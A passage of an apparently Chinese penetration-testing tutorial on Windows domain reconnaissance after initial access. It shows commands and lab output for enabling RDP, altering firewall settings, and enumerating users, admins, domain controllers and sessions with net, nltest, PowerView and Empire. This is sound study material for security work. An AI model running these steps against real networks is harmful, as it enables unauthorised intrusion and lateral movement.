dir&#x3D;in localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>自定义防火墙日志储存位置</li></ul><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看计算机代理配置情况 </p></li></ul><pre class="line-numbers language-none"><code class="language-none">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>查询并开启远程连接服务</p><ul><li>查看远程连接端口（0xd3d换成10进制即3389）</li></ul><pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在Windows Server 2003 中开启3389 端口</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h2 id="2、自动收集本地工作组信息"><a href="#2、自动收集本地工作组信息" class="headerlink" title="2、自动收集本地工作组信息"></a>2、自动收集本地工作组信息</h2><h3 id="wmic-脚本"><a href="#wmic-脚本" class="headerlink" title="wmic 脚本"></a>wmic 脚本</h3><p>wmic 脚本下载地址：<a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-11_12-59-56.png"></p><h3 id="PowerShsell-Empire"><a href="#PowerShsell-Empire" class="headerlink" title="PowerShsell Empire"></a>PowerShsell Empire</h3><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p><ul><li><p>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</p></li><li><p>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</p></li></ul><p>当使用 Empire 使主机上线后，可调用<code>powershell/situational_awareness/host/winenum</code>模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-11_15-27-11.png"></p><p>调用<code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p><h1 id="0x04-域内信息收集"><a href="#0x04-域内信息收集" class="headerlink" title="0x04 域内信息收集"></a>0x04 域内信息收集</h1><h2 id="1、判断是否存在域"><a href="#1、判断是否存在域" class="headerlink" title="1、判断是否存在域"></a>1、判断是否存在域</h2><h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。    </p><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; ipconfig &#x2F;allWindows IP 配置   主 DNS 后缀 . . . . . . . . . .  : teamssix.com   DNS 后缀搜索列表  . . . . . . . . : teamssix.com以太网适配器 Ethernet0:   IPv4 地址 . . . . . . . . . . .. : 192.168.7.110   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 192.168.7.1   DNS 服务器  . . . . . . . . . . . : 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP</p><pre class="line-numbers language-none"><code class="language-none">nslookup teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nslookup teamssix.com服务器:  UnKnownAddress:  192.168.7.7名称:    teamssix.comAddress:  192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统详细信息"><a href="#系统详细信息" class="headerlink" title="系统详细信息"></a>系统详细信息</h3><pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; systeminfo | findstr 域:域: teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="当前登录域与域用户"><a href="#当前登录域与域用户" class="headerlink" title="当前登录域与域用户"></a>当前登录域与域用户</h3><pre class="line-numbers language-none"><code class="language-none">net config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net config workstation | findstr 域工作站域                    TEAMSSIX工作站域 DNS 名称            teamssix.com登录域                      TEAMSSIX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net time &#x2F;domain\\dc.teamssix.com 的当前时间是 2021&#x2F;2&#x2F;13 20:49:56命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、收集域内基础信息"><a href="#2、收集域内基础信息" class="headerlink" title="2、收集域内基础信息"></a>2、收集域内基础信息</h2><h3 id="查看域"><a href="#查看域" class="headerlink" title="查看域"></a>查看域</h3><pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net view &#x2F;domainDomain-------------------------------------------------------------------------------TEAMSSIX命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域内计算机"><a href="#查看域内计算机" class="headerlink" title="查看域内计算机"></a>查看域内计算机</h3><pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain:domain_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net view &#x2F;domain:teamssix服务器名称            注解-------------------------------------------------------------------------------\\DANIEL10\\DANIEL7\\DC命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域内用户组列表"><a href="#查看域内用户组列表" class="headerlink" title="查看域内用户组列表"></a>查看域内用户组列表</h3><pre class="line-numbers language-none"><code class="language-none">net group &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的组帐户-------------------------------------------------------------------------------*Admins*Domain Admins*Domain Computers*Domain Users*Enterprise Admins命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域用户组信息"><a href="#查看域用户组信息" class="headerlink" title="查看域用户组信息"></a>查看域用户组信息</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;Enterprise Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &quot;Enterprise Admins&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Enterprise Admins注释     指定的公司系統管理員成员-------------------------------------------------------------------------------Administrator命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域密码策略信息"><a href="#查看域密码策略信息" class="headerlink" title="查看域密码策略信息"></a>查看域密码策略信息</h3><pre class="line-numbers language-none"><code class="language-none">net accounts &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net accounts &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。强制用户在时间到期之后多久必须注销?:     从不密码最短使用期限(天):                  1密码最长使用期限(天):                  42密码长度最小值:                        7保持的密码历史记录长度:                 24锁定阈值:                            从不锁定持续时间(分):                      30锁定观测窗口(分):                      30计算机角色:                           PRIMARY命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域信任信息"><a href="#查看域信任信息" class="headerlink" title="查看域信任信息"></a>查看域信任信息</h3><pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;domain_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nltest &#x2F;domain_trusts域信任的列表:    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、收集域用户和管理员信息"><a href="#3、收集域用户和管理员信息" class="headerlink" title="3、收集域用户和管理员信息"></a>3、收集域用户和管理员信息</h2><h3 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h3><pre class="line-numbers language-none"><code class="language-none">net user &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net user &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的用户帐户-------------------------------------------------------------------------------admin                    Administrator                    daniel10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查询域用户详细信息"><a href="#查询域用户详细信息" class="headerlink" title="查询域用户详细信息"></a>查询域用户详细信息</h3><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; wmic useraccount get &#x2F;allAccountType  Caption                        Description                                                     Disabled  Domain    FullName                               InstallDate  LocalAccount  Lockout  Name                  PasswordChangeable  PasswordExpires  PasswordRequired  SID                                            SIDType  Status512          DANIEL10\Administrator         管理计算机(域)的内置帐户                                        TRUE      DANIEL10                                                      TRUE          FALSE    Administrator         TRUE                FALSE            TRUE              S-1-5-21-1097120846-822447287-3576165687-500   1        Degraded512          DANIEL10\DefaultAccount        系统管理的用户帐户。                                            TRUE      DANIEL10                                                      TRUE          FALSE    DefaultAccount        TRUE                FALSE            FALSE             S-1-5-21-1097120846-822447287-3576165687-503   1        Degraded<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查询存在的用户"><a href="#查询存在的用户" class="headerlink" title="查询存在的用户"></a>查询存在的用户</h3><pre class="line-numbers language-none"><code class="language-none">dsquery user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; dsquery user&quot;CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;teamssix,DC&#x3D;com&quot;&quot;CN&#x3D;Guest,CN&#x3D;Users,DC&#x3D;teamssix,DC&#x3D;com&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常用的 dsquery 命令</p><pre class="line-numbers language-none"><code class="language-none">dsquery computer - 查找目录中的计算机dsquery contact - 查找目录中的联系人dsquery subnet - 查找目录中的子网dsquery group - 查找目录中的组dsquery ou - 查找目录中的组织单位dsquery site - 查找目录中的站点dsquery server - 查找目录中的域控制器dsquery user - 查找目录中的用户dsquery quota - 查找目录中的配额dsquery partition - 查找目录中的分区dsquery * - 用通用的 LDAP 查询查找目录中的任何对象<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、查找域控制器"><a href="#4、查找域控制器" class="headerlink" title="4、查找域控制器"></a>4、查找域控制器</h2><h3 id="查看域控器主机名"><a href="#查看域控器主机名" class="headerlink" title="查看域控器主机名"></a>查看域控器主机名</h3><pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;DCLIST:teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nltest &#x2F;DCLIST:teamssix获得域“teamssix”中 DC 的列表(从“\\DC”中)。    dc.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nslookup -type&#x3D;SRV _ldap._tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nslookup -type&#x3D;SRV _ldap._tcp_ldap._tcp.teamssix.com SRV service location:          priority       &#x3D; 0          weight         &#x3D; 100          port           &#x3D; 389          svr hostname   &#x3D; dc.teamssix.comdc.teamssix.com internet address &#x3D; 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">netdom query pdc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; netdom query pdc域的主域控制器:DC命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域控器组"><a href="#查看域控器组" class="headerlink" title="查看域控器组"></a>查看域控器组</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;domain controllers&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &quot;domain controllers&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Controllers注释     在網域所有的網域控制站成员-------------------------------------------------------------------------------DC$命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5、定位域管理员"><a href="#5、定位域管理员" class="headerlink" title="5、定位域管理员"></a>5、定位域管理员</h2><h3 id="psloggedon"><a href="#psloggedon" class="headerlink" title="psloggedon"></a>psloggedon</h3><p>在 Windows 上使用 <code>net session</code> 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。</p><p>psloggedon 下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><pre class="line-numbers language-none"><code class="language-none">psloggedon.exe [-] [-l] [-x] [\\computername|username]-显示支持的选项和用于输出值的单位。-l仅显示本地登录，不显示本地和网络资源登录。-x不显示登录时间。\\computername指定要列出登录信息的计算机的名称。Username指定用户名，在网络中搜索该用户登录的计算机。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; PsLoggedon.exe -l \\192.168.7.7Users logged on locally:2021&#x2F;2&#x2F;13 20:53:08         TEAMSSIX\Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限。</p><p>PVEFindADUser 下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p><pre class="line-numbers language-none"><code class="language-none">-h显示帮助信息-u检测程序是否有新版本-current [&quot;username&quot;]-current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC-noping阻止尝试枚举用户登录名之前对目标计算机执行ping命令-target此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; PVEFindADUser.exe -current [+] Finding currently logged on users ? true [+] Finding last logged on users ? false [+] Enumerating all computers... [+] Number of computers found : 15 [+] Launching queries     [+] Processing host : dc.teamssix.com (Windows Server 2008 R2 Datacenter;Service Pack 1)         - Logged on user : teamssix\administrator     [+] Processing host : daniel7.teamssix.com (Windows 7 专业版;Service Pack 1)     [+] Processing host : daniel10.teamssix.com (Windows 10 专业版) [+] Report written to report.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="netview"><a href="#netview" class="headerlink" title="netview"></a>netview</h3><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p><p>Netview 下载地址：<a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p><pre class="line-numbers language-none"><code class="language-none">-h               显示帮助信息-f filename.txt  指定要提取主机列表的文件-e filename.txt  指定要排除的主机名的文件-o filename.txt  将所有输出重定向到指定的文件-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索-c               对已找到的共享目录&#x2F;文件的访问权限进行检查-i interval      枚举主机之间等待的秒数-j jitter        应用于间隔的抖动百分比（0.0-1.0）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; netview.exe -d[+] Number of hosts: 3[+] Host: DANIEL10Enumerating AD Info[+] DANIEL10 - Comment -[+] D - OS Version - 10.0[+] DANIEL10 - MSSQL ServerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.110Enumerating Share InfoEnumerating Session InfoEnumerating Logged-on Users[+] DANIEL10 - Logged-on - TEAMSSIX\daniel10[+] Host: DCEnumerating AD Info[+] DC - Comment -[+] D - OS Version - 6.1[+] DC - Domain ControllerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.7……内容较多故省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h3><p>常用的 NSE 脚本如下：</p><p><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p><p><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p><p><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</p><p><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p><p><code>smb-enum-sessions.nse</code>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p><p><code>smb-os-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p><p>NES 脚本下载地址：<a href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nmap --script&#x3D;smb-os-discovery.nse -p 445 192.168.7.107Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-21 09:44 CSTNmap scan report for 192.168.7.107Host is up (0.00053s latency).PORT    STATE SERVICE445&#x2F;tcp open  microsoft-dsHost script results:| smb-os-discovery:|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)|   OS CPE: cpe:&#x2F;o:microsoft:windows_7::sp1:professional|   Computer name: daniel7|   NetBIOS computer name: DANIEL7\x00|   Domain name: teamssix.com|   Forest name: teamssix.com|   FQDN: daniel7.teamssix.com|_  System time: 2021-02-21T09:44:33+08:00Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-23_17-38-11.png"></p><h3 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code> $Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p><p>接着在 powershell中输入<code> Import-Module PowerView</code>即可导入PowerView，使用<code> Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Import-Module PowerViewPS C:\Users\daniel10&gt; Get-Command -Module PowerViewCommandType     Name                                               Version    Source-----------     ----                                               -------    ------Alias           Find-UserTrustGroup                                1.0        PowerViewAlias           Get-ComputerProperties                             1.0        PowerView……内容较多故省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PowerView 脚本下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><blockquote><p>注：在打开上面的下载地址时会看到该项目已被转移到其他项目下，但是当我在使用新版本的 PowerView 脚本时，发现找不到<code>Invoke-StealthUserHunter</code>命令，而旧版本的 PowerView 有<code>Invoke-StealthUserHunter</code>命令</p></blockquote><p><strong>Invoke-StealthUserHunter</strong>：只需要进行一次查询，就可以获取域里面的所有用户。其原理为：从<code>user.HomeDirectories</code>中提取所有用户，并对每个服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对每台机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView 默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就会使用<code>Invoke-UserHunter</code>.</p><p><strong>Invoke-UserHunter</strong>：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用 NetSessionEnum 和 NetWkstaUserEnumAPI )扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Invoke-UserHunterUserDomain   : TEAMSSIXUserName     : AdministratorComputerName : dc.teamssix.comIP           : 192.168.7.7SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : daniel10ComputerName : daniel10.teamssix.comIP           : 192.168.7.110SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : AdministratorComputerName : daniel7.teamssix.comIP           : 192.168.7.107SessionFrom  :LocalAdmin   :<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PowerView 中的其他信息收集模块：</p><ul><li>Get-NetDomain:获取当前用户所在域名称</li><li>Get-NetUser：获取所有用户的详细信息</li><li>Get-NetDomainController：获取所有域控制器的信息</li><li>Get-NetComputer：获取域内所有机器的详细信息</li><li>Get-NetOU：获取域中的OU信息</li><li>Get-NetGroup：获取所有域内组和组成员信息</li><li>Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息</li><li>Get-NetShare：获取当前域内所有的网络共享信息</li><li>Get-NetSession：获取指定服务器的会话</li><li>Get-NetRDPSession：获取指定服务器的远程连接</li><li>Get-NetProcess：获取远程主机的进程</li><li>Get-UserEvent：获取指定用户的日志</li><li>Get-ADObject：获取活动目录的对象</li><li>Get-NetGPO：获取域内所有组的策略对象</li><li>Get-DomainPolicy：获取域默认策略或域控制器策略</li><li>Invoke-UserHunter：获取域用户登陆的计算机信息及该用户是否有本地管理员权限</li><li>Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户</li><li>Invoke-UserEventHunter：根据用户日志查询某域用户登陆过哪些域机器</li></ul><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>Empire中的<code>user_hunter</code>模块用于查找域管理员登陆的机器，使用 powershell/situational_awareness/network/powerview/user_hunter 模块，可查看哪个用户登陆哪台主机。</p><pre class="line-numbers language-none"><code class="language-none">(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- 3XRCWAB2 ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         2256   5&#x2F;0.0    2021-02-22 20:39:54(Empire: agents) &gt; usemodule powershell&#x2F;powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter) &gt; set Agent 3XRCWAB2(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter) &gt; execute[*] Tasked 3XRCWAB2 to run TASK_CMD_JOB[*] Agent 3XRCWAB2 tasked with task ID 1[*] Tasked agent 3XRCWAB2 to run module powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter[*] Valid results returned by 192.168.7.7……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6、查找域管理员进程"><a href="#6、查找域管理员进程" class="headerlink" title="6、查找域管理员进程"></a>6、查找域管理员进程</h2><h3 id="获取域管理员列表"><a href="#获取域管理员列表" class="headerlink" title="获取域管理员列表"></a>获取域管理员列表</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;Domain Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;net group &quot;Domain Admins&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Admins注释     指定的域管理员成员-------------------------------------------------------------------------------Administrator命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="列出本机的所有进程及进程用户"><a href="#列出本机的所有进程及进程用户" class="headerlink" title="列出本机的所有进程及进程用户"></a>列出本机的所有进程及进程用户</h3><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;tasklist &#x2F;v映像名称                       PID 会话名              会话#       内存使用  状态            用户名                                                 CPU 时间 窗口标题&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 